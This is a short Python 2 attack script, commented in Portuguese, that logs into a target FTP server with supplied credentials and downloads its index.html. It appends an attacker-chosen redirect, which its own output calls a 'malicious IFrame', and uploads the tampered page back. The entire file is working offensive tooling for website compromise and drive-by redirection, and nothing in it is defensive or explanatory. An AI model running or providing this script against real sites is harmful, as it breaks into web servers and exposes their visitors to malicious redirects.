#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib, optparse


def paginaInject(ftp, pagina, redirecionar):
    f = open(pagina + '.tmp', 'w')
    ftp.retrlines('RETR ' + pagina, f.write)
    print '[+] Página baixada: ' + pagina

    f.write(redirecionar)
    f.close()
    print '[+] Injetado IFrame malicioso em: ' + pagina

    ftp.storlines('STOR ' + pagina, open(pagina + '.tmp'))
    print '[+] Página injetada enviada: ' + pagina

def inicio():
    analisador = optparse.OptionParser('use injetar_pagina_ftp '+\
      '-H <host alvo> -u <usuario> -s <senha> -r <redirecionar>')
    analisador.add_option('-H', dest='host', type='string',\
      help='especifique o host alvo')
    analisador.add_option('-u', dest='usuario', type='string',\
      help='especifique o usuario alvo')
    analisador.add_option('-s', dest='senha', type='string',\
      help='especifique a senha do usuario alvo')
    analisador.add_option('-r', dest='redirecionar', type='string',\
      help='especifique o redirecionamento')

    (opcoes, args) = analisador.parse_args()

    host = opcoes.host
    usuario = opcoes.usuario
    senha = opcoes.senha
    redirecionar = opcoes.redirecionar

    if (host == None) | (usuario == None) | (senha == None) | (redirecionar == None):
        print analisador.usage
        exit(0)

    ftp = ftplib.FTP(host)
    ftp.login(usuario, senha)
    paginaInject(ftp, 'index.html', redirecionar)

if __name__ == '__main__':
    inicio()
